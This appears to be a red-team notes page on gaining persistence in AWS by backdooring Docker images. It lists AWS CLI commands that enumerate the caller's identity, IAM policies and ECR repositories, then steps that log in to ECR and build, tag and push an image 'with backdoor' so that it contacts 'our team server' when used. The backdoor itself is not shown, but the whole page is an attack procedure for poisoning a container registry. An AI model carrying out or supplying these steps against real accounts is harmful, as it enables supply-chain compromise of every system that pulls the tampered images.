# Persistence

### It's possible to modify an existing docker image with a backdoor, when this image is used it will trigger our team server.

## Steps:

#### 1) Enumerating the user

 - aws sts get-caller-identity

#### 2) Listing manager policies attached to the IAM role

 - aws iam list-attached-role-policies --role-name NAME

#### 3) Getting information about the version of the managed policy

 - aws iam get-policy-version --policy-arn ARN --version-id ID

#### 4) Getting information about the repositories in container registry

 - aws ecr describe-repositories

#### 5) Listing all images in the repository

 - aws ecr list-images --repository-name NAME

#### 6) Listing information about an image

 - aws ecr describe-images --repository-name NAME --image-ids imageTag=NAME

#### 7) Authenticate the docker daemon to ECR

 - aws ecr get-login-password --region REGION | docker login --username AWS --password PASSWORD

#### 8) Building images with backdoor

 - docker build -t IMAGE_NAME

#### 9) Tagging the docker image

 - docker tag IMAGE_NAME ecr_addr:Image_Name

#### 10) Pushing the image to ECR

 - docker push ecr_addr:Image_Name
